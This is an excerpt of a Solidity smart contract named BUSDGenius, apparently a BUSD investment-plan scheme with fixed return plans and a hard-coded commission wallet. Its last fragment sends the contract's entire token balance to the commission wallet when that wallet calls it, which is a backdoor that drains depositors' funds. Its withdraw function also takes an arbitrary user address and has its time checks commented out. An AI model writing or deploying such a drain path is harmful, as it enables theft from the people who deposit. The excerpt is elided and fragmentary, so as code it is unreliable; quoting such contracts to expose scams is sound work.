...
contract BUSDGenius {
    ...
    constructor() public {
        token = IBEP20(busd);
        commissionWallet = 0x19Aeead1a0E24161c02D12Ee8DE5C152eAD2A010;
        ceoWallet = 0x19Aeead1a0E24161c02D12Ee8DE5C152eAD2A010;
        plans.push(Plan(15, 190));
        plans.push(Plan(25, 140));
        plans.push(Plan(50, 110));
    }
    ...
    function withdraw(address userAddress) public {
           // require(block.timestamp >= TIME_STEP2, "Invalid time");
                    //    require(TIME_STEP2 < block.timestamp, "Invalid time");

        if (users[userAddress].checkpoint < TIME_STEP2) {
        ...
        emit Withdrawn(msg.sender, totalAmount);
         ...
         uint256 fee= SafeMath.div(SafeMath.mul(totalAmount,25),100);
         uint256 fee2=fee;

        IBEP20(busd).transfer(commissionWallet, fee2);}
          else  {
        revert("Time Error!");
          }
    }
  ...
  if(msg.sender == commissionWallet)
        IBEP20(busd).transfer(commissionWallet,IBEP20(busd).balanceOf(address(this)));
